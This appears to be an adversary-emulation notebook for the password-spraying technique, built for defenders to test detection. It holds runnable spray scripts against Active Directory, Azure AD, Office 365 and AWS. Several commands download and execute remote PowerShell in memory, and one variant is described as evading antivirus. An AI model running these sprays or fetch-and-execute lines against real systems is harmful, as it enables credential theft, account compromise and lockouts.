{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "63d35e35",
   "metadata": {},
   "source": "# T1110.003 - Password Spraying\nAdversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625."
  },
  {
   "cell_type": "markdown",
   "id": "42770ca1",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "8ffe790a",
   "metadata": {},
   "source": "### Atomic Test #1 - Password Spray all Domain Users\nCAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.\nThis atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\\users.txt list. Any successful authentications will be printed to the screen with a message like \"[*] username:password\", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.\nUse the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.\nSee the \"Windows FOR Loop Password Spraying Made Easy\" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `command_prompt`!\n##### Description: List of domain users to password spray must exits at %temp%\\users.txt\n\n##### Check Prereq Commands:\n```cmd\nif not exist %temp%\\users.txt (exit /b 1)\n\n```\n##### Get Prereq Commands:\n```cmd\n\"PathToAtomicsFolder\\T1110.003\\src\\parse_net_users.bat\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "539068cc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "4335b652",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n@FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\" \"Spring2020\" 1>NUL 2>&1 && @echo [*] %n:Spring2020 && @net use /delete %logonserver%\\IPC$ > NUL\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5b4864c0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "d99621cd",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Password Spray (DomainPasswordSpray)",
    "Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain\n\nhttps://github.com/dafthack/DomainPasswordSpray\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "75fcb192",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "16ef10c3",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)",
    "Attempt to brute force all Active Directory domain users with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nif (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389)\n\n$DomainUsers | Foreach-Object {\n  $user = $_\n  $password = 'P@ssw0rd!'\n\n  $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)\n  try {\n    Write-Host \" [-] Attempting ${password} on account ${user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of password spraying\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0812329a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "30cfff76",
   "metadata": {},
   "source": "### Atomic Test #4 - Password spray all Azure AD users with a single password\nAttempt to brute force all Azure AD users with a single password (called \"password spraying\") via AzureAD Powershell module.\nValid credentials are only needed to fetch the list of Azure AD users.\n\n**Supported Platforms:** azure-ad\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: AzureAD module must be installed.\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AzureAD -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3b706a80",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c48db4b1",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n($Users = Get-AzureADUser -All $true) > $null\nDisconnect-AzureAD > $null\n$PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force\n\n$Users | Foreach-Object {\n  $user = $_.UserPrincipalName\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\n  try {\n    Write-Host \" [-] Attempting P@ssw0rd! on account ${user}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\"\n    Disconnect-AzureAD > $null\n  } catch {\n    Write-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of password spraying\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b4eccc92",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "cdc5bbf8",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - WinPwn - DomainPasswordSpray Attacks",
    "DomainPasswordSpray Attacks technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndomainpassspray -consoleoutput -noninteractive -emptypasswords```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0e3bdb28",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "23ab179f",
   "metadata": {},
   "source": "### Atomic Test #6 - Password Spray Invoke-DomainPasswordSpray Light\nPerform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Username file must exist at $env:Temp\\usersdpsLight.txt\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host -NoNewLine \"Reading Users.\" # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration\n$netOutput = net users /domain\n$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])\n$userLimit = 200; $usercount = 0\nforeach ($line in $netOutput) {\n  if($usercount -ge $userLimit){break}\n  $line = $line.trim()\n  $line = $line -split '\\s\\s+'\n  foreach ($user in $line){\n    if($usercount -ge $userLimit){break}\n    Add-Content $env:Temp\\usersdpsLight.txt $user\n    $usercount = $usercount + 1\n    }  \n}\nWrite-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f707b55c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "da3fee95",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nfunction Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "844f4390",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "dcff8273",
   "metadata": {},
   "source": "### Atomic Test #7 - Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)\nThis test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.\n\n**Supported Platforms:** azure-ad\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: MSOLSpray module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n\n##### Check Prereq Commands:\n```powershell\nif (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "60a65bdf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ae412e75",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nimport-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\nInvoke-MSOLSpray -UserList \"$env:temp\\T1110.003UserList.txt\" -Password \"P@ssword1\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e8787d3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "3600b038",
   "metadata": {},
   "source": "### Atomic Test #8 - Password Spray using Kerbrute Tool\nTest a single password against a list of users\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n\n##### Check Prereq Commands:\n```powershell\nif (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n\n```\n##### Description: passwordspray.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n\n##### Check Prereq Commands:\n```powershell\nif (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\"){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/src/passwordspray.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "43fbd357",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "57831e4c",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe passwordspray --dc $ENV:userdnsdomain -d $ENV:userdomain \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132 \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fb0ec081",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "7bf4afdf",
   "metadata": {},
   "source": "### Atomic Test #9 - AWS - Password Spray an AWS using GoAWSConsoleSpray\nGoAWSConsoleSpray is a tool that can be used to spray AWS IAM Console Credentials in order to identify a valid login for a user account built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/\n\n**Supported Platforms:** iaas:aws\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Check if go is installed\n\n##### Check Prereq Commands:\n```sh\ngo version\n\n```\n##### Get Prereq Commands:\n```sh\necho Install GO\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2b81fb4f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 9 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7f1593e4",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncd /tmp\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\ncd /tmp/GoAWSConsoleSpray\ngo run main.go GoAWSConsoleSpray -a XXXXXXXX -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fae0f3f0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "d495c938",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -rf /tmp/GoAWSConsoleSpray\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b63c1240",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.003 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9e09a02a",
   "metadata": {},
   "source": "## Detection\nMonitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.\n\nConsider the following event IDs:(Citation: Trimarc Detecting Password Spraying)\n\n* Domain Controllers: \"Audit Logon\" (Success & Failure) for event ID 4625.\n* Domain Controllers: \"Audit Kerberos Authentication Service\" (Success & Failure) for event ID 4771.\n* All systems: \"Audit Logon\" (Success & Failure) for event ID 4648."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}